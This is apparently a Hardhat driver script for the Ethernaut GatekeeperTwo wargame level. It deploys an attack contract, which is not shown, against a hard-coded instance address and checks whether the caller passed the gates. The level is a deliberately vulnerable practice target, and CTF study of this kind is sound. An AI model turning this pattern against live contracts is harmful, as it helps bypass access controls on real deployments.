const { ethers } = require("hardhat");
const hre = require("hardhat");

async function main() {
  const [owner] = await ethers.getSigners();
  // attach your instance address
  const Instance = "0xDC22460Be35a78E890C984101bafA4F6C7884e06";
  const GateKeeperTwoContract = await ethers.getContractFactory(
    "GatekeeperTwo"
  );
  const GateKeeperTwo = GateKeeperTwoContract.attach(Instance);

  const AttackGateKeeperTwoContract = await ethers.getContractFactory(
    "AttackGateKeeperTwo"
  );
  const AttackGateKeeperTwo = await AttackGateKeeperTwoContract.deploy(
    GateKeeperTwo.address
  );
  await AttackGateKeeperTwo.deployed();

  const entrant = await GateKeeperTwo.entrant();
  console.log(entrant == owner.address);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
